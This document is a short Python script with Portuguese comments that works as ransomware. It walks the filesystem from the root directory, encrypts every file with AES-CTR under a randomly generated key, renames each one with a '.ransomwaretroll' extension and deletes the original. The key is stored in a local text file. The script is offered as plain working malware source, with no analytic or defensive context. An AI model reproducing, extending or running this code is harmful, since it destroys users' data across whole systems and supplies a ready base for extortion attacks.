import os
import pyaes
import random
import string

# Chave aleatória
def gerar_chave():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16)).encode()

def criptografar_arquivo(file_path, chave):
    with open(file_path, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(chave)
    crypto_data = aes.encrypt(file_data)

    new_file_path = file_path + ".ransomwaretroll"

    with open(new_file_path, 'wb') as new_file:
        new_file.write(crypto_data)

    os.remove(file_path)

def criptografar_diretorio(diretorio, chave):
    for root, dirs, files in os.walk(diretorio):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            criptografar_arquivo(file_path, chave)

chave = gerar_chave()

with open("salvo.txt", "wb") as f:
    f.write(chave)

diretorio_alvo = "/"  # Altere conforme a necessidade
criptografar_diretorio(diretorio_alvo, chave)

print("Todos os arquivos foram criptografados com sucesso. A chave foi salva em 'salvo.txt'.")
